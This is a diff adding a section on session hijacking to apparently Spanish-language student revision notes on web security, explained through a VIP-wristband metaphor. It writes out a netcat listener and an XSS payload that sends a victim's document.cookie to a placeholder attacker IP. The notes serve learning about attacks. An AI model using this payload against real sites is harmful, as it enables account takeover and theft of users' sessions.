@@ -80,4 +80,22 @@ El payload suele ir después de un símbolo `/#/`. Todo lo que va tras el `#` es
 - **Metáfora:** Es como dejarle una nota al mayordomo (navegador) para que cambie los cuadros de la casa mientras el dueño (servidor) está durmiendo y no ve quién entra.
 
 ---
+
+## 🍪 Gestión de Sesiones y Robo de Datos
+
+### 5. Session Hijacking (Secuestro de Sesión)
+**¿Qué es?** Es el acto de robar la "identidad temporal" de un usuario. En lugar de robar la contraseña, robas la prueba de que el usuario ya se ha autenticado.
+
+**La Metáfora: La Pulsera VIP.**
+Imagina que entras en un festival tras enseñar tu DNI (login). Te ponen una **pulsera VIP** (la Cookie de Sesión). A partir de ese momento, los guardias ya no te piden el DNI, solo miran tu pulsera.
+- **El Robo:** El atacante no intenta falsificar tu DNI, intenta cortarte la pulsera mientras no miras y ponérsela él. Si lo logra, el guardia (el servidor) creerá que el atacante es el dueño original.
+
+**¿Cómo funciona el ataque técnico?**
+1.  **El Receptor (Netcat - `nc -l -p 8888`):** El atacante abre una "oreja digital" en su propia máquina. Está esperando que llegue información a ese puerto. Es como abrir un buzón de correos clandestino.
+2.  **El Gancho (XSS):** El atacante inyecta un script en la web. Cuando la víctima entra, su propio navegador ejecuta:
+    `document.location='http://[IP_KALI]:8888/?cookie=' + document.cookie`
+3.  **La Acción:** El navegador de la víctima, sin que ella lo sepa, hace una petición al buzón del atacante enviándole su "pulsera VIP" (`document.cookie`) en la URL.
+4.  **El Resultado:** El atacante mira su terminal de `netcat`, ve la cookie, se la pone en su propio navegador y ¡listo! Ya está dentro de la cuenta de la víctima.
+
+---
 *(Documento en constante actualización según avancemos en el repaso)*
